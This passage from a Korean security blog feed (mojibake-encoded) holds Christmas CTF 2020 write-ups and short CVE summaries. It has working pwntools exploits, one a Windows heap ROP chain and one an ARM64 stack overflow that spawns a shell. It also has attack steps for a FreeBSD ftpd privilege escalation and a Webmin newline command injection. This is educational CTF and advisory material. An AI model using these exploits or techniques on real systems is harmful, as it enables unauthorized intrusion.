class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restoreAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modifyAddr</span>(<span class="hljs-params">idx, item, new</span>):</span>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(idx))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(item))p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(new)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p = remote(<span class="hljs-string">&quot;host&quot;</span>,<span class="hljs-number">55555</span>)print(p.recv())p.sendline(<span class="hljs-string">&quot;L0ch&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)<span class="hljs-comment"># node 3-&gt;4 , node 4-&gt;3</span>deleteAddr(<span class="hljs-number">4</span>)deleteAddr(<span class="hljs-number">3</span>)restoreAddr(<span class="hljs-number">4</span>)restoreAddr(<span class="hljs-number">3</span>)<span class="hljs-comment"># reference count ingeter overflow - free addressbook</span>listAddr(<span class="hljs-number">3275</span>)<span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)pivot = ntdll + <span class="hljs-number">0xA0E24</span> <span class="hljs-comment"># mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</span>ret = ntdll + <span class="hljs-number">0x144F</span>add_rsp_28h = ntdll + <span class="hljs-number">0x3EDC</span>ppr = ntdll + <span class="hljs-number">0x8B8F0</span> <span class="hljs-comment"># pop rdx rcx r8 r9 r10 r11 ret</span>read = ucrtbase + <span class="hljs-number">0x17BC0</span>write = ucrtbase + <span class="hljs-number">0x174C0</span> <span class="hljs-comment"># pivot</span>payload = p64(pivot)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ret)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)<span class="hljs-comment"># arg 2, buffer </span>payload += p64(<span class="hljs-number">0x3</span>)<span class="hljs-comment"># arg 1, fd</span>payload += p64(<span class="hljs-number">0x30</span>)<span class="hljs-comment"># arg 3, size</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(read)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># write flag</span>payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)payload += p64(<span class="hljs-number">1</span>)payload += p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(write)<span class="hljs-comment"># overwrite vtable</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>,p64(obj_leak+<span class="hljs-number">152</span>))p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;-1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(p64(obj_leak+<span class="hljs-number">152</span>))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">136</span>+p64(obj_leak+<span class="hljs-number">168</span>)+payload)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;6&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recv())</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - baby-RudOlPh</title>
    <link href="/2020/12/29/l0ch/baby_rudolph/"/>
    <url>/2020/12/29/l0ch/baby_rudolph/</url>
    
    <content type="html"><![CDATA[<p>baby_RudOlPhëŠ” baby ì‹œë¦¬ì¦ˆ ë‹µê²Œ ì´ë²ˆ Christmas CTFì—ì„œ ê°€ì¥ ë§ì€ ì†”ë²„ê°€ ë‚˜ì™”ë˜ ë¬¸ì œ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤.<br><img src="/2020/12/29/l0ch/baby_rudolph/1.png"></p><p>ë°”ì´ë„ˆë¦¬ë¥¼ ë°›ê³  ë³´í˜¸ê¸°ë²•ê³¼ ì•„í‚¤í…ì³ë¥¼ í™•ì¸í•´ë³´ë©´ 64bit ARMì´ê³ , NX bitë§Œ ê±¸ë ¤ìˆëŠ”ê±¸ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/2.png"><br>ë¶„ì„í•´ë³´ë©´ vulnì´ë¼ëŠ” í•¨ìˆ˜ë¥¼ ëŒ€ë†“ê³  ì¤ë‹ˆë‹¤. read í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ”ë° 0x100ë§Œí¼ ë°›ì•„ì„œ stack overwflowê°€ ë°œìƒí•˜ë„¤ìš”</p><p><img src="/2020/12/29/l0ch/baby_rudolph/3.png"></p><p><code>get_arm</code> í•¨ìˆ˜ë¥¼ ë³´ë©´ ì²« ë²ˆì§¸ ì¸ìì˜ ê°’ì´ <code>0x1225</code> ë©´ <code>system(&quot;/bin/sh&quot;)</code>ì„ ì‹¤í–‰í•´ ì‰˜ì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/4.png"></p><p><code>ARMmaker</code> í•¨ìˆ˜ì—ëŠ” ì¸ìë¥¼ ì„¸íŒ… í•  ìˆ˜ ìˆëŠ” gadgetì´ ìˆë„¤ìš”.</p><ol><li><code>vuln</code> ì˜ return addressë¥¼ <code>ARMmaker</code>ì˜ gadgetìœ¼ë¡œ overwrite</li><li>gadgetì„ í†µí•´ ì¸ìë¥¼ <code>0x1225</code>ë¡œ ì„¸íŒ…í•˜ê³  <code>get_arm</code> í˜¸ì¶œ</li><li>get shell!</li></ol><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *p = process(<span class="hljs-string">&quot;./baby_RudOlPh&quot;</span>)context.log_level = <span class="hljs-string">&quot;debug&quot;</span>p.recvuntil(<span class="hljs-string">&quot;\\n&quot;</span>)payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">72</span>payload += p64(<span class="hljs-number">0x400724</span>)payload += p64(<span class="hljs-number">0x1225</span>) + <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">16</span>payload += p64(<span class="hljs-number">0x400738</span>)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/29/l0ch/baby_rudolph/5.png"></p><p>ë‰´ë¹„ìš© í¬ë„ˆë¸” ë¬¸ì œë¥¼ ë‚´ë ¤ëŠ”ë° ê·¸ëƒ¥ ë‚´ë©´ ì‹¬ì‹¬í•´ì„œ 64bit ARMìœ¼ë¡œ ë‚´ë´¤ìŠµë‹ˆë‹¤ ã…ã… ì—­ì‹œ ë§ì€ ë¶„ë“¤ì´ í’€ì–´ì£¼ì…¨ìŠµë‹ˆë‹¤! </p><p>(ë¬¸ì œ ë§Œë“œëŠ” ì‹œê°„ë³´ë‹¤ ë„ì»¤ì— ì„¸íŒ…í•˜ëŠ”ë° ë“œëŠ” ì‹œê°„ì´ ë” ì˜¤ë˜ ê±¸ë ¸ë˜ ê±´ ë¹„ë°€..)</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Picky Eater</title>
    <link href="/2020/12/29/l0ch/picky_eater/"/>
    <url>/2020/12/29/l0ch/picky_eater/</url>
    
    <content type="html"><![CDATA[<p>picky_eaterëŠ” snake gameì„ ìœˆë„ìš° ì½˜ì†”ë¡œ êµ¬í˜„í•œ ë¯¸ìŠ¤í¬ ë¬¸ì œì…ë‹ˆë‹¤.</p><blockquote><p>ì˜›ë‚ ì˜›ë‚ ì— ë¨¹ê³ ì‹¶ì€ ê²ƒë§Œ ë¨¹ëŠ” í¸ì‹ìŸì´ ë±€ì´ ìˆì—ˆì–´ìš” í¸ì‹ìŸì´ ë±€ì€ ë¨¹ê¸° ì‹«ì€ê±¸ ë¨¹ìœ¼ë©´ í‹°ë¥¼ ë‚¸ë‹µë‹ˆë‹¤!</p></blockquote><p>ìœ„ì™€ ê°™ì€ ë¬¸ì œì˜ ë””ìŠ¤í¬ë¦½ì…˜ê³¼ í•¨ê»˜ ë°”ì´ë„ˆë¦¬ê°€ ì£¼ì–´ì§‘ë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/picky_eater/1.png"></p><p>ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ ìœ„ì™€ ê°™ì€ í™”ë©´ì´ ë‚˜ì˜¤ëŠ”ë°, ì•„ë¬´í‚¤ë‚˜ ëˆ„ë¥´ë©´ snake ê²Œì„ì´ ì‹œì‘ë©ë‹ˆë‹¤.</p><p>snake ê²Œì„ì˜ ë£°ì€ ê°„ë‹¨í•©ë‹ˆë‹¤! ì²˜ìŒì—” ì§§ì€ ê¸¸ì´ì˜ ë±€ì´ ë‚˜ì˜¤ëŠ”ë°, ì´ ë±€ì„ ì»¨íŠ¸ë¡¤í•´ í™”ë©´ìƒì— ë‚˜ì˜¤ëŠ” ë¨¹ì´ë¥¼ ë¨¹ìœ¼ë©´ ë±€ ê¸¸ì´ê°€ ê¸¸ì–´ì§€ê³  ë±€ì˜ ì†ë„ê°€ ë¹¨ë¼ì§€ëŠ” ê°„ë‹¨í•œ ë£°ì´ì£ </p><p><img src="/2020/12/29/l0ch/picky_eater/2.png"></p><p>ë±€ì˜ ë¨¹ì´ë¡œëŠ” ë¬¸ìê°€ í•˜ë‚˜ì”© ë‚˜ì˜µë‹ˆë‹¤. ë¬¸ìë“¤ì„ í•˜ë‚˜ì”© ëª¨ì•„ë³´ë©´<code>XMAS&#123;$0lo_P1ickyY_$n@4k3?!&#125;</code> ë¼ëŠ” í”Œë˜ê·¸ê°€ ë‚˜ì˜¤ëŠ”ë°, ì´ í”Œë˜ê·¸ë¥¼ ì¸ì¦í•˜ë©´ ì¸ì¦ì— ì‹¤íŒ¨í•˜ê²Œ ë©ë‹ˆë‹¤.</p><p>ì§„ì§œ í”Œë˜ê·¸ëŠ” ê²Œì„ì˜ ê·œì¹™ì„ í†µí•´ ì–»ì„ ìˆ˜ ìˆëŠ”ë°, ë¬¸ì œì˜ ë””ìŠ¤í¬ë¦½ì…˜ì„ ë‹¤ì‹œ í•œ ë²ˆ ë³¼ê¹Œìš”?</p><blockquote><p>ì˜›ë‚ ì˜›ë‚ ì— ë¨¹ê³ ì‹¶ì€ ê²ƒë§Œ ë¨¹ëŠ” í¸ì‹ìŸì´ ë±€ì´ ìˆì—ˆì–´ìš” í¸ì‹ìŸì´ ë±€ì€ ë¨¹ê¸° ì‹«ì€ê±¸ ë¨¹ìœ¼ë©´ í‹°ë¥¼ ë‚¸ë‹µë‹ˆë‹¤!</p></blockquote><p>ë¨¹ì´ë¥¼ ë¨¹ìœ¼ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë³€í™”ê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><ol><li>ê¸¸ì´ê°€ ê¸¸ì–´ì§</li><li>ì†ë„ê°€ ë¹¨ë¼ì§</li></ol><p>ì†ë„ëŠ” ìœ¡ì•ˆìœ¼ë¡œ í™•ì¸í•˜ê¸° ì–´ë ¤ìš¸ ê²ƒ ê°™ìœ¼ë‹ˆ, ê¸¸ì´ì™€ ê´€ë ¨ëœ ê·œì¹™ì„ ìƒê°í•˜ë©° í”Œë ˆì´í•´ë´…ì‹œë‹¤.</p><p>ì²˜ìŒ ê¸¸ì´ëŠ” ë¨¸ë¦¬ë¥¼ ì œì™¸í•˜ê³  4ì¹¸ì…ë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/picky_eater/3.png"></p><p>ì²« ë²ˆì§¸ ë¨¹ì´ì¸ <code>X</code> ë¥¼ ë¨¹ê³  Pë¡œ ì¼ì‹œì •ì§€ë¥¼ í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><p>ë±€ì˜ ê¸¸ì´ê°€ 6ìœ¼ë¡œ ë‘ ì¹¸ ê¸¸ì–´ì¡Œë„¤ìš”. ì´ë ‡ê²Œ <code>XMAS&#123;$</code> ê¹Œì§€ ë¨¹ì–´ë³´ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/picky_eater/4.png"></p><p>ê¸¸ì´ê°€ 16ì´ë‹ˆê¹Œ XMAS{$ ë¥¼ ë¨¹ì—ˆì„ë• ëª¨ë‘ ê¸¸ì´ê°€ ê¸¸ì–´ì§„ ê²ƒì„ í™•ì¸ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. </p><p><img src="/2020/12/29/l0ch/picky_eater/5.png"></p><p>ê·¸ëŸ¬ë‚˜ <code>0</code> ì„ ë¨¹ì—ˆì„ë•ŒëŠ” ê¸¸ì´ê°€ 16 ê·¸ëŒ€ë¡œêµ°ìš”. ì´ë ‡ê²Œ  <code>XMAS&#123;$0lo_P1ickyY_$n@4k3?!&#125;</code> ì¤‘ ë¨¹ì—ˆì„ ë•Œ ê¸¸ì´ê°€ ëŠ˜ì–´ë‚˜ì§€ ì•ŠëŠ” ë¬¸ìë¥¼ ë¹¼ë©´ <code>XMAS&#123;$o_P1cky_$n4k3!&#125;</code> ë¼ëŠ” ì§„ì§œ í”Œë˜ê·¸ê°€ ë‚˜ì˜¤ê²Œ ë©ë‹ˆë‹¤!</p><p><img src="/2020/12/29/l0ch/picky_eater/6.png"></p><p>ì°¸ê³ ë¡œ IDAì—ì„œ ë¶„ì„í•´ë³´ë©´ fake flagê°€ ìˆê³ </p><p><img src="/2020/12/29/l0ch/picky_eater/7.png"></p><p>í”Œë˜ê·¸ index ê°€ ìˆëŠ” ë°°ì—´ì´ ìˆì–´ ì´ê±¸ ë³´ê³  í’€ì–´ë„ ë©ë‹ˆë‹¤.</p><p>ì—¬ë‹´ìœ¼ë¡œ.. fake flagë¥¼ ë„ˆë¬´ ì§„ì§œì²˜ëŸ¼ ë„£ì–´ë†“ëŠ” ë°”ëŒì—.. picky_eaterê°€ ê³µê°œë˜ìë§ˆì í”Œë˜ê·¸ ì¸ì¦ìš”ì²­ê³¼ ë¬¸ì˜ê°€ í­ì£¼í•´ì„œ ì •ì‹ ì„ ëª»ì°¨ë ¸ì—ˆë„¤ìš” í•˜í•˜..</p><p><img src="/2020/12/29/l0ch/picky_eater/8.png"></p><blockquote><p>ê°„ë‹¨ìš”ì•½ì§¤ - picky_eater ê³µê°œ 10ë¶„ ë’¤ ë¬¸ì œ ë³„ í”Œë˜ê·¸ ì¸ì¦ìš”ì²­íšŸìˆ˜(íƒœê·¸ í´ë¼ìš°ë“œ)</p></blockquote><p>í”Œë˜ê·¸ ì¸ì¦ ê´€ë ¨í•´ì„œ ë¬¸ì œê°€ ì—†ë‹¤ëŠ” ê³µì§€ë¥¼ ì˜¬ë¦° ì´í›„ ë§ì€ íŒ€ë“¤ì´ í’€ì–´ì£¼ì…¨ì§€ë§Œ, ë¬¸ì œ ì¶œì œ ì¤‘ ë¯¸ì²˜ ìƒê° ëª»í•œ ì  ë•Œë¬¸ì— ì°¸ê°€ìë¶„ë“¤ê»˜ í˜¼ë€ì„ ë“œë ¤ ë°˜ì„±í•˜ê³  ìˆìŠµë‹ˆë‹¤ ã… ã… ã… </p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-7468: FreeBSD local privilege escalation</title>
    <link href="/2020/12/29/l0ch/2020-12-29/"/>
    <url>/2020/12/29/l0ch/2020-12-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/12/21/cve-2020-7468-turning-imprisonment-to-advantage-in-the-freebsd-ftpd-chroot-jail">CVE-2020-7468: TURNING IMPRISONMENT TO ADVANTAGE IN THE FREEBSD FTPD CHROOT JAIL</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>FreeBSD ftpd</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>FreeBSDì˜ ftp ë°ëª¬ì—ì„œ root ë¡œ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ <code>chroot</code> í•¨ìˆ˜ì˜ ë¡œê·¸ì¸ ì²˜ë¦¬ ë¶€ë¶„ì˜ ê²°í•¨ìœ¼ë¡œ ì¸í•´ ë°œìƒí•©ë‹ˆë‹¤.</p><p><code>chroot</code> í•¨ìˆ˜ì—ì„œ <code>chdir</code>ì´ ì‹¤íŒ¨í•  ê²½ìš° ftpdëŠ” <code>chroot</code>ì˜ jailì—ì„œ ìƒˆë¡œìš´ ë¡œê·¸ì¸ ì—°ê²°ì„ ê¸°ë‹¤ë¦½ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ ê°•ì œë¡œ <code>chdir</code>ì´ ì‹¤íŒ¨í•˜ë„ë¡ ìœ ë„í•˜ë©´ í•´ì»¤ê°€ ì—…ë¡œë“œí•œ íŒŒì¼ì„ ì‹œìŠ¤í…œ íŒŒì¼ì¸ ê²ƒì²˜ëŸ¼ ì†ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì˜ ìƒì„¸ ê³µê²© ë‹¨ê³„ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>í•´ì»¤ê°€ FTP ìœ ì € ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸í•©ë‹ˆë‹¤.</li><li><code>etc/spwd.db</code> ì— ì„ì˜ì˜ root íŒ¨ìŠ¤ì›Œë“œë¥¼ ì„¤ì •í•´ ì—…ë¡œë“œí•©ë‹ˆë‹¤.</li><li><code>chmod 0</code> ìœ¼ë¡œ í™ˆ ë””ë ‰í„°ë¦¬ì— ëŒ€í•œ ê¶Œí•œì„ ë³€ê²½í•˜ê³  ìœ ì € ê³„ì •ìœ¼ë¡œ ë‹¤ì‹œ ë¡œê·¸ì¸í•©ë‹ˆë‹¤.</li><li>3ë²ˆìœ¼ë¡œ ì¸í•´ ë¡œê·¸ì¸ ì¤‘ <code>chdir</code>ì´ ì‹¤íŒ¨í•˜ê³  <code>ftpd chroot jail</code> ë‚´ë¶€ì—ì„œ ìƒˆë¡œìš´ ì—°ê²°ì„ ê¸°ë‹¤ë¦½ë‹ˆë‹¤. ì´í›„ ëª¨ë“  ì‹œìŠ¤í…œ íŒŒì¼ ì•¡ì„¸ìŠ¤ëŠ” í•´ì»¤ ê³„ì •ì˜ í™ˆ ë””ë ‰í„°ë¦¬ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤.</li><li>ê²°ê³¼ì ìœ¼ë¡œ ì´í›„ rootë¡œ ë¡œê·¸ì¸í•  ë•Œ í•´ì»¤ê°€ ì—…ë¡œë“œí•œ <code>etc/spwd.db</code> ì˜ root íŒ¨ìŠ¤ì›Œë“œ í…Œì´ë¸”ì„ ì°¸ì¡°í•´ íŒ¨ìŠ¤ì›Œë“œë¥¼ ê²€ì¦í•˜ê³  í•´ì»¤ê°€ root ê³„ì •ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ol><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ ë¦¬ë²„ìŠ¤ì‰˜ì„ ì‹¤í–‰ì‹œí‚¤ëŠ” ëª…ë ¹ì–´ë¥¼ í¬í•¨í•œ íŒŒì¼ì„ ì—…ë¡œë“œí•´ root ê¶Œí•œìœ¼ë¡œ ì‰˜ì„ ì‹¤í–‰í•˜ê³ , chroot jailì„ ë²—ì–´ë‚˜ ì„ì˜ì˜ ëª…ë ¹ì–´ ë˜í•œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>FreeBSD</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>ftpd</tag>
      
      <tag>chroot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-35606: Arbitrary Command Execution in Webmin</title>
    <link href="/2020/12/28/idioth/2020-12-28/"/>
    <url>/2020/12/28/idioth/2020-12-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html">Webmin-1962-PU-Escape-Bypass-Remote-Command-Exectuion</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Wemin 1.962 ì´í•˜ ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Webminì—ì„œ Remote Command Execution ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì„ í†µí•´ íŒ¨í‚¤ì§€ ì—…ë°ì´íŠ¸ ëª¨ë“ˆì„ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ìœ ì €ê°€ root ê¶Œí•œìœ¼ë¡œ arbitrary commandë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12840">CVE-2019-12840</a>ì— ëŒ€í•œ í•„í„°ë§ì€ package name ë³€ìˆ˜ê°€ system command ì•ˆì— ì§ì ‘ì ìœ¼ë¡œ ë“¤ì–´ê°€ë¯€ë¡œ URL encodingì„ í†µí•´ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.(ex. command lineì„ í•œ ì¤„ ì•„ë˜ì—ì„œ ì‹¤í–‰)</p><p><code>u</code> íŒŒë¼ë¯¸í„°ëŠ” <code>update.cgi</code>ì—ì„œ <code>@pkgs</code> ë³€ìˆ˜ì— ë“¤ì–´ê°€ì„œ ì—¬ëŸ¬ ì—°ì‚°ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. <code>update.cgi</code>ì˜ í•¨ìˆ˜ë“¤ì€ <code>package-updates-lib.pl</code>ì—ì„œ í˜¸ì¶œë˜ëŠ”ë°, ê·¸ì¤‘ <code>package_install(package-name, [system], [new-install])</code>ì€ update systemì´ë‚˜ Weminì„ í†µí•´ íŒ¨í‚¤ì§€ë¥¼ ì„¤ì¹˜í•  ìˆ˜ ìˆê³  ì—…ë°ì´íŠ¸ëœ íŒ¨í‚¤ì§€ ëª©ë¡ì„ ë°˜í™˜í•©ë‹ˆë‹¤.</p><p>íŒ¨ì§€í‚¤ë¥¼ ì„¤ì¹˜í•  ë•Œ CVE-2019-12840ì— ëŒ€í•œ ì¡°ì¹˜ë¡œ <code>s/\\(-)|\\(.)/string/g;</code> í•„í„°ë§ì´ ê±¸ë ¤ìˆìŠµë‹ˆë‹¤. íŒ¨í‚¤ì§€ ì´ë¦„ì€ http request ë³€ìˆ˜ì´ë¯€ë¡œ <code>%0a</code>ë‚˜ <code>%0c</code> ë“±ì„ í†µí•´ escapeê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. íŒ¨í‚¤ì§€ ì´ë¦„ 